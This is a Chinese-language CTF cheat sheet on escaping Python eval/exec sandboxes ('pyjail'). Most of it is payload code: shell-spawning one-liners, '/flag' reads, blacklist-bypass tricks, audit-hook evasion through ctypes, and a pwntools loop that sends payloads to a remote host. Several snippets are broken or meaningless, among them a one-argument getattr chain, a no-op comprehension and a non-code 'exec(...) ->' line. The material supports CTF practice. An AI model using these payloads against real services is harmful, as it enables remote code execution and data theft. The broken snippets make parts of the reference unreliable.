---
title: Python 沙箱逃逸（pyjail / misc 向）
category: misc
tags: [pyjail, 沙箱逃逸, python, __subclasses__, 内置函数, audit_hook]
signals: [题目是 python 即兴输入, 屏蔽了 os 和 builtins, 有黑名单过滤括号或引号, 需要 cat flag.txt, 题面给了 nc 连接, 输入被 exec/eval, 只允许一行 payload]
difficulty: medium
source: "CTF-Wiki Python 沙盒章节 / Python 官方文档(审计钩子) / pyjail writeup 合集"
tools: [python3, nc, pwntools, pycharm-debug, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目给 `nc host port`，连上后提示 "input >"，让你输入 Python 代码。
- 源码里有 `eval(input())` 或 `exec(input())`，并且先把 `os`、`__builtins__` 删掉。
- 黑名单里出现 `os`、`system`、`import`、`open`、`read`、`flag`、`/`、`'`、`"`、`+`、`_` 等。
- 题面说"只能输入一行"或"长度不超过 100 字节"。
- 运行时版本提示 `Python 3.10` / `3.11`，规则越来越严格（`__globals__` 链退化）。

## 二、原理

Python 的 `eval/exec` 在**同一个解释器进程**里执行代码，只要还能接触到任意一个对象，就能沿 `__class__ → __bases__ → object → __subclasses__()` 找到 `os._wrap_close`、`subprocess.Popen`、`_io.FileIO` 等类，从而拿到可执行/读写文件的能力。沙盒的几种弱化形式：

1. **删掉 builtins**：`del __builtins__.__dict__['__import__']` —— 可用 `().__class__.__bases__[0].__subclasses__()` 找回。
2. **黑名单字符/单词**：可用拼接、`chr()`、`bytes`、`getattr`、变量名混淆绕过。
3. **禁 `import`**：`__import__`、`importlib`、`sys.modules`、`runpy` 均可绕。
4. **只允许表达式**（eval）：用 lambda + 推导式完成赋值。
5. **审计钩子 `sys.addaudithook`**（现代题）：拦截 `os.system`/`subprocess`/`open` 事件，就必须绕过钩子本身（在 hook 注册前执行，或找不触发审计事件的类）。

## 三、操作步骤

1. **读源码**：找到输入点（`eval`/`exec`/`input`）、黑名单、是否 `restricted builtins`。
2. **探环境**：先传 `print(__import__('sys').version)` 或简单回显，确认有没有输出（eval 只返回表达式值）。
3. **找可用链**：
   - `open` → `__builtins__['open']`、`__loader__`、`io.open`、`os.open`
   - 执行 → `os.system`、`subprocess.Popen`、`pty.spawn`、`platform.popen`
   - 绕过 import → `__import__(...)`、`importlib.import_module`、`sys.modules['os']`
4. **测试单步**：先 `print` 出 `subclasses()` 的索引，再拼接出最终 payload。
5. **本地复现**：把沙盒代码存成 `sandbox.py`，本地跑通再上远端。

## 四、命令/脚本

### 经典 payload（按顺序试）

```python
# 0. 直连
__import__('os').system('/bin/sh')
__import__('os').system('cat /flag')

# 1. builtins 被删 —— 从 object 子类拿
().__class__.__bases__[0].__subclasses__()
# 找 _io.FileIO / os._wrap_close / subprocess.Popen / builtins
[x for x in ().__class__.__bases__[0].__subclasses__() if 'Popen' in str(x)][0]

# 2. 读文件（不依赖 os）
open('/flag').read()
[x for x in ().__class__.__bases__[0].__subclasses__() if 'FileIO' in x.__name__][0]('/flag').read()

# 3. 拿回 __builtins__（globals 链）
(lambda: 0).__globals__['__builtins__']['__import__']('os').system('sh')
# class 定义里也可拿到
''.__class__.__mro__[1].__subclasses__()

# 4. import 链
__import__('os').popen('cat /flag').read()
__import__('subprocess').check_output(['cat','/flag'])
__import__('pty').spawn('/bin/sh')
__import__('platform').popen('cat /flag').read()
__import__('timeit').timeit("__import__('os').system('sh')", number=1)
__import__('runpy').run_path('/tmp/x.py')

# 5. sys.modules 直达（os 已 import 过）
__import__('sys').modules['os'].system('sh')
```

### 过滤器绕过技巧

```python
# 禁下划线：用 getattr 拼接
getattr(getattr(().__class__, '__bases__'), '__getitem__')(0)
# 通用：从字符串构造
[(lambda s: getattr(__builtins__, s) if 0 else 0) for s in []]
# 用 format 拼关键字
getattr(__import__('o'+'s'), 'sy'+'stem')('sh')
# chr 拼接
__import__(chr(111)+chr(115)).system(chr(115)+chr(104))

# 禁引号：用 bytes 的 docstring / 空字符串 join
[b for b in ().__class__.__bases__]  # 不涉及字符串

# 禁括号（只允许 eval 一行）：
exec('print(1)')  ->  '__import__("os").system("sh")'  仍要括号
# 完全禁括号：用装饰器/上下文表达式
@__import__('os').system
def _(): pass
# 或者
[*map(__import__('os').system, ['sh'])]

# 禁数字：True/False 位运算构造
__import__('os').system(chr(True+True+True+True)*0+'sh')  # 视题意

# 禁点号：getattr 链
getattr(getattr(__import__('os'),'system'))('sh')

# 禁 import 与点号：先用 help()/license 的 pager 下单
help()  -> 输入 !sh 或 !cat /flag 后回车
```

### 一句式"读取全部子类索引"的调试脚本

```python
# 本地调试：找 os._wrap_close 的索引号
import subprocess, sys
payload = "[i for i,c in enumerate(().__class__.__bases__[0].__subclasses__()) if c.__name__=='_wrap_close']"
print(subprocess.check_output([sys.executable, '-c',
    f'print({payload})']).decode())
# 得到索引 N 后：().__class__.__bases__[0].__subclasses__()[N].__init__.__globals__['system']('sh')
```

### 审计钩子（sys.addaudithook）题

```python
# 查看当前注册的钩子是否存在（通常看不到），命中策略：
# 1) 用不触发 audit 事件的方式读文件：mmap? 需 open；改用 /proc/self/fd/ ？
# 2) 用 error 信息泄漏法：报错信息里带内容
class A:
    def __init__(self): raise Exception(open('/flag').read())
A()
# 3) 利用 import 机制读文件：源文件的 traceback 行
try:
    __import__('/flag')
except Exception as e:
    print(e)
# 4) 若只拦 os.system，可用 ctypes 直接 syscall
__import__('ctypes').CDLL(None).system(b'sh')
```

### 本地复现沙盒

```bash
# 把题目源码保存为 sandbox.py，然后：
python3 sandbox.py <<< '__import__("os").system("id")'
# 用 pwntools 自动化尝试一串 payload
python3 - <<'PY'
from pwn import *
P = ["__import__('os').system('cat /flag')",
     "().__class__.__bases__[0].__subclasses__()",
     "(lambda:0).__globals__['__builtins__']['__import__']('os').system('cat /flag')"]
io = remote('TARGET', 1337)
for p in P:
    io.sendlineafter(b'>', p.encode())
    print(p, '=>', io.recvuntil(b'>', timeout=2))
PY
```

## 五、常见坑 / 变体

- **eval 只返回值**：用 `(...)  # 或 print(...)`，`exec` 才可多行。
- **版本差异**：Python 3.11+ 有些类链变了，`__subclasses__()` 索引每次运行都不同，**必须打印出索引再拼**，不要背数字。
- **禁 `/` 和 `flag`**：字符可拆 `'fl'+'ag'`、`chr(47)`、`glob.glob('/f*')`。
- **禁 `_`**：所有双下划线属性都要通过 `getattr(x, chr(95)*2)` 拼。
- **禁 `[` `]`**：用 `.__getitem__(i)`、`next(iter(...))`。
- **文件描述符已打开**：`os.read(3, 100)` 常能直接读到已被打开的文件。
- **BLACKLIST 递归检查字符串**：把 payload 存到 `bytes` 再 `decode`，绕过静态匹配。
- **misc 与 pwn 交叉**：pyjail 的进阶（seccomp、chroot、namespace）见 kb/pwn 相关篇。

## 六、参考来源

- [CTF Wiki - Python 沙盒逃逸](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/)
- [Python 官方文档 - sys.addaudithook 审计事件](https://docs.python.org/3/library/audit_events.html)
- [Python 数据模型（__class__/__mro__/__globals__）](https://docs.python.org/3/reference/datamodel.html)
- [PayloadsAllTheThings - Command Injection（含 Python 绕过技巧）](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Builtin 函数列表（builtins 模块文档）](https://docs.python.org/3/library/functions.html)
